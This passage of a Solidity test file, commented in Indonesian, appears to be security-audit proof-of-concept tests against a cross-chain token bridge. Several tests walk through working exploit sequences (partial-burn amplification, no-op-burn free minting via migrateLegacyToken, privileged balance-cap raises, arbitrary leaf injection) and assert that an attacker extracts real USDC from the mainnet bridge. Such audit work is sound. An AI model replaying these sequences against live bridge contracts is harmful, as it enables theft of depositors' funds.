                "setMultipleSovereignTokenAddress(uint32[],address[],address[],bool[])",
                new uint32[](0),
                new address[](0),
                new address[](0),
                new bool[](0)
            )
        );
        assertFalse(ok1, "V3: setMultipleSovereignTokenAddress HARUS tidak ada");
        (bool ok2, ) = address(bridgeMain).call(
            abi.encodeWithSignature(
                "setSovereignWETHAddress(address,bool)",
                address(fakeToken),
                false
            )
        );
        assertFalse(ok2, "V3: setSovereignWETHAddress HARUS tidak ada");
        (bool ok3, ) = address(bridgeMain).call(
            abi.encodeWithSignature(
                "migrateLegacyToken(address,uint256,bytes)",
                address(fakeToken),
                uint256(1000e6),
                bytes("")
            )
        );
        assertFalse(ok3, "V3: migrateLegacyToken HARUS tidak ada");
        (bool ok4, ) = address(bridgeMain).call(
            abi.encodeWithSignature(
                "setLocalBalanceTree(uint32[],address[],uint256[])",
                new uint32[](0),
                new address[](0),
                new uint256[](0)
            )
        );
        assertFalse(ok4, "V3: setLocalBalanceTree HARUS tidak ada");
        (bool ok5, ) = address(bridgeMain).call(
            abi.encodeWithSignature(
                "forwardLET((uint8,uint32,address,uint32,address,uint256,bytes)[],bytes32)",
                new bytes(0),
                bytes32(0)
            )
        );
        assertFalse(ok5, "V3: forwardLET HARUS tidak ada");

        // Mapping palsu tidak tertulis di mana pun.
        assertEq(
            bridgeMain.tokenInfoToWrappedToken(
                keccak256(abi.encodePacked(uint32(0), address(usdc)))
            ),
            address(0),
            "V3: tidak ada wrapped mapping (0,USDC) di mainnet"
        );
        (uint32 on, address oa) = bridgeMain.wrappedTokenToTokenInfo(
            address(fakeToken)
        );
        assertEq(on, 0, "V3: originNetwork fake harus 0");
        assertEq(oa, address(0), "V3: originTokenAddress fake harus 0");
        emit log("V3: TERKONFIRMASI - klaim audit r8 benar: mainnet tanpa fungsi mapping; satu-satunya penulis mapping adalah claimAsset terverifikasi");
    }

    // ============ V4: partial burn (50%) - amplifikasi ~2x ============
    // Token membakar separuh saja: penyerang dengan 1000 token palsu bisa
    // membuat leaf total ~2000 (deret geometri), dibatasi LBT global.

    function test_R9V4_partialBurnDoublesExtraction() public {
        uint256 IMPORT = 10000e6;
        uint256 HOLDINGS = 1000e6;
        _importUsdcToS(IMPORT, victim);
        partialToken.mint(attacker, HOLDINGS);

        uint32[] memory nets = new uint32[](1);
        nets[0] = 0;
        address[] memory origins = new address[](1);
        origins[0] = address(usdc);
        address[] memory sovs = new address[](1);
        sovs[0] = address(partialToken);
        bool[] memory notMint = new bool[](1);
        notMint[0] = false;
        vm.prank(managerAddr);
        bridgeL2.setMultipleSovereignTokenAddress(nets, origins, sovs, notMint);

        bytes memory md = abi.encode("Partial", "PART", uint8(18));
        uint256 totalLeaf;
        uint256 iters;
        while (iters < 40) {
            uint256 bal = partialToken.balanceOf(attacker);
            uint256 lbt = bridgeL2.localBalanceTree(
                _lbtKey(0, address(usdc))
            );
            if (bal < 2 || lbt == 0) break;
            uint256 amt = bal < lbt ? bal : lbt;
            bool ok = _bridgeAssetRaw(
                address(bridgeL2),
                attacker,
                0,
                attacker,
                amt,
                address(partialToken)
            );
            assertTrue(ok, "V4: bridge partial HARUS sukses");
            _pushSLeaf(0, 0, address(usdc), 0, attacker, amt, md);
            totalLeaf += amt;
            iters++;
        }
        // Deret geometri 1000+500+250+... -> 2000 (minus dust 1 unit).
        assertGe(totalLeaf, 1_999_000_000, "V4: total leaf harus ~2x holdings");
        assertLe(
            partialToken.balanceOf(attacker),
            1,
            "V4: saldo partial penyerang habis (dust <= 1)"
        );
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            IMPORT - totalLeaf,
            "V4: LBT berkurang sebesar total leaf"
        );

        // Klaim 2 leaf pertama di mainnet: 1000 + 500 = 1500 USDC asli
        // dari 1000 token palsu (1,5x sudah di 2 langkah; limit 2x).
        assertTrue(
            _claimAssetMainnetFromS(0, 0, address(usdc), attacker, 1000e6, md),
            "V4: klaim leaf 1 HARUS sukses"
        );
        assertTrue(
            _claimAssetMainnetFromS(1, 0, address(usdc), attacker, 500e6, md),
            "V4: klaim leaf 2 HARUS sukses"
        );
        assertEq(usdc.balanceOf(attacker), 1500e6, "V4: penyerang +1500 USDC");
        emit log("V4: POSITIF - partial burn 50% amplifikasi ~2x (total leaf ~2000 dari 1000 token); akar masalah sama dengan R8-F (burn tak diverifikasi)");
    }

    // ============ V5a: migrateLegacyToken - burn no-op -> mint gratis ============
    // migrateLegacyToken (permissionless!) memanggil _bridgeWrappedAsset
    // atas legacy token lalu mint current token. Bila legacy = token palsu
    // (burn no-op) dan current = token real, penyerang mencetak wrapped
    // kanonik TANPA BATAS LBT pada langkah mint-nya.

    function test_R9V5a_migrateLegacyTokenNoOpBurnFreeMint() public {
        _importUsdcToS(1000e6, victim);

        // Manager: map fake -> (0,USDC), lalu map token real -> (0,USDC).
        uint32[] memory nets = new uint32[](1);
        nets[0] = 0;
        address[] memory origins = new address[](1);
        origins[0] = address(usdc);
        address[] memory sovs = new address[](1);
        sovs[0] = address(fakeToken);
        bool[] memory notMint = new bool[](1);
        notMint[0] = false;
        vm.prank(managerAddr);
        bridgeL2.setMultipleSovereignTokenAddress(nets, origins, sovs, notMint);
        sovs[0] = address(openMint);
        vm.prank(managerAddr);
        bridgeL2.setMultipleSovereignTokenAddress(nets, origins, sovs, notMint);

        // Penyerang (0 fake) migrate 1.000.000 R2 gratis.
        assertEq(fakeToken.balanceOf(attacker), 0, "V5a: penyerang 0 fake");
        vm.prank(attacker);
        bridgeL2.migrateLegacyToken(address(fakeToken), 1_000_000e6, "");
        assertEq(
            openMint.balanceOf(attacker),
            1_000_000e6,
            "V5a: penyerang mencetak 1.000.000 R2 dari NOL"
        );
        assertEq(fakeToken.balanceOf(attacker), 0, "V5a: burn no-op");

        // R2 adalah wrapped kanonik (0,USDC) di S: bridge 1000 keluar.
        bytes memory md = abi.encode("Real2", "R2", uint8(6));
        bool okBridge = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            1000e6,
            address(openMint)
        );
        assertTrue(okBridge, "V5a: bridge R2 HARUS sukses");
        _pushSLeaf(0, 0, address(usdc), 0, attacker, 1000e6, md);
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            0,
            "V5a: LBT terkuras"
        );
        assertTrue(
            _claimAssetMainnetFromS(0, 0, address(usdc), attacker, 1000e6, md),
            "V5a: klaim mainnet HARUS sukses"
        );
        assertEq(usdc.balanceOf(attacker), 1000e6, "V5a: penyerang +1000 USDC");
        emit log("V5a: POSITIF - migrateLegacyToken: burn no-op mencetak wrapped kanonik tanpa batas (mint tak di-gate LBT); exit tetap dibatasi LBT");
    }

    // ============ V5b: setLocalBalanceTree menaikkan cap R8-F ============
    // onlyGlobalExitRootRemover + emergency: LBT bisa di-set arbitrer.
    // Remover yang menaikkan LBT[(0,USDC)] 1000 -> 5000 membuat serangan
    // R8-F menguras 5x lipat.

    function test_R9V5b_setLocalBalanceTreeRaisesR8FCap() public {
        _importUsdcToS(1000e6, victim);
        _mapFakeToMainnetUsdcOnS();

        bridgeL2.activateEmergencyState();
        uint32[] memory nets = new uint32[](1);
        nets[0] = 0;
        address[] memory origins = new address[](1);
        origins[0] = address(usdc);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 5000e6;
        bridgeL2.setLocalBalanceTree(nets, origins, amounts);
        bridgeL2.deactivateEmergencyState();
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            5000e6,
            "V5b: LBT di-set 1000 -> 5000 oleh remover"
        );

        bool okBridge = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            5000e6,
            address(fakeToken)
        );
        assertTrue(okBridge, "V5b: bridge 5000 HARUS sukses pasca-raise");
        bytes memory md = abi.encode("Fake", "FAKE", uint8(18));
        _pushSLeaf(0, 0, address(usdc), 0, attacker, 5000e6, md);
        assertTrue(
            _claimAssetMainnetFromS(0, 0, address(usdc), attacker, 5000e6, md),
            "V5b: klaim mainnet HARUS sukses"
        );
        assertEq(usdc.balanceOf(attacker), 5000e6, "V5b: penyerang +5000 USDC (5x cap import)");
        assertEq(
            usdc.balanceOf(address(bridgeMain)),
            5_000_000e6 - 5000e6,
            "V5b: bridge mainnet kehilangan 5000"
        );
        emit log("V5b: POSITIF (kemampuan) - setLocalBalanceTree (remover+emergency) menaikkan cap R8-F 1000 -> 5000; by-design, role trusted, bukan temuan mandiri");
    }

    // ============ V5c: forwardLET - leaf arbitrer tanpa LBT & tanpa burn ============
    // onlyGlobalExitRootRemover + emergency: forwardLET memanggil
    // super._addLeafBridge (tanpa _decreaseLocalBalanceTree) - leaf aset
    // arbitrer masuk LER tanpa burn, tanpa transfer, tanpa cek LBT.

    function test_R9V5c_forwardLetAddsLeafWithoutLbtOrBurn() public {
        bridgeL2.activateEmergencyState();
        bytes32 leaf = _leaf(
            0,
            0,
            address(usdc),
            0,
            attacker,
            1000e6,
            ""
        );
        bytes32[] memory one = new bytes32[](1);
        one[0] = leaf;
        bytes32 expectedLER = MerkleHelper.treeRoot(one);

        AgglayerBridgeL2.LeafData[] memory leaves = new AgglayerBridgeL2.LeafData[](
            1
        );
        leaves[0] = AgglayerBridgeL2.LeafData({
            leafType: 0,
            originNetwork: 0,
            originAddress: address(usdc),
            destinationNetwork: 0,
            destinationAddress: attacker,
            amount: 1000e6,
            metadata: ""
        });
        bridgeL2.forwardLET(leaves, expectedLER);
        bridgeL2.deactivateEmergencyState();

        assertEq(bridgeL2.depositCount(), 1, "V5c: 1 leaf tercipta");
        assertEq(bridgeL2.getRoot(), expectedLER, "V5c: root cocok");
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            0,
            "V5c: LBT tetap 0 - forwardLET tidak menyentuh LBT"
        );
        leavesS.push(leaf);
        // Klaim memakai metadata leaf forwardLET ("") - leaf dibuat dgn md "".
        bool okClaim = _claimAssetMainnetFromS(
            0,
            0,
            address(usdc),
            attacker,
            1000e6,
            ""
        );
        assertTrue(okClaim, "V5c: klaim mainnet atas leaf forwardLET HARUS sukses");
        assertEq(usdc.balanceOf(attacker), 1000e6, "V5c: penyerang +1000 USDC");
        emit log("V5c: POSITIF (kemampuan) - forwardLET (remover+emergency) mencetak leaf aset arbitrer tanpa burn/LBT; by-design, role trusted, bukan temuan mandiri");
    }

    // ============ V5d: setMultipleClaims - griefing klaim, reversibel ============
    // onlyGlobalExitRootRemover bisa menandai klaim sah sebagai "claimed"
    // sebelum korban mengklaim (korban revert AlreadyClaimed), lalu
    // unsetMultipleClaims memulihkannya. Tidak ada pencurian dana.

    function test_R9V5d_setMultipleClaimsGriefingReversible() public {
        MockERC20Full usdc2 = new MockERC20Full("USD Coin", "USDC", 6);
        usdc2.mint(victim, 100e6);
        vm.prank(victim);
        usdc2.approve(address(bridgeMain), 100e6);
        vm.prank(victim);
        bridgeMain.bridgeAsset(2, victim, 100e6, address(usdc2), false, "");
        bytes memory md = abi.encode("USD Coin", "USDC", uint8(6));
        bytes32 leaf = _leaf(0, 0, address(usdc2), 2, victim, 100e6, md);
        bytes32[] memory one = new bytes32[](1);
        one[0] = leaf;
        bytes32 mRoot = MerkleHelper.treeRoot(one);
        bytes32[32] memory proofLocal = MerkleHelper.treeProof(one, 0);
        bytes32[32] memory emptyProof;

        // Remover menandai klaim (leafIndex 0, source 0) SEBELUM korban klaim.
        uint256[] memory gidx = new uint256[](1);
        gidx[0] = MAINNET_FLAG | uint256(0);
        bridgeL2.setMultipleClaims(gidx);
        assertTrue(bridgeL2.isClaimed(0, 0), "V5d: bit klaim harus ter-set");

        vm.prank(victim);
        (bool okBlocked, ) = address(bridgeL2).call(
            abi.encodeCall(
                AgglayerBridge.claimAsset,
                (
                    proofLocal,
                    emptyProof,
                    MAINNET_FLAG | uint256(0),
                    mRoot,
                    bytes32(0),
                    0,
                    address(usdc2),
                    2,
                    victim,
                    100e6,
                    md
                )
            )
        );
        assertFalse(okBlocked, "V5d: klaim korban HARUS revert (AlreadyClaimed)");

        // Remover membatalkan penandaan -> klaim korban sukses.
        bridgeL2.unsetMultipleClaims(gidx);
        assertFalse(bridgeL2.isClaimed(0, 0), "V5d: bit klaim harus bersih lagi");
        vm.prank(victim);
        bridgeL2.claimAsset(
            proofLocal,
            emptyProof,
            MAINNET_FLAG | uint256(0),
            mRoot,
            bytes32(0),
            0,
            address(usdc2),
            2,
            victim,
            100e6,
            md
        );
        address wrapped2 = bridgeL2.tokenInfoToWrappedToken(
            keccak256(abi.encodePacked(uint32(0), address(usdc2)))
        );
        assertEq(_wbal(wrapped2, victim), 100e6, "V5d: korban terima 100 wrapped");
        emit log("V5d: setMultipleClaims = griefing reversibel oleh remover trusted (blokir klaim, tanpa pencurian); bukan temuan");
    }
}
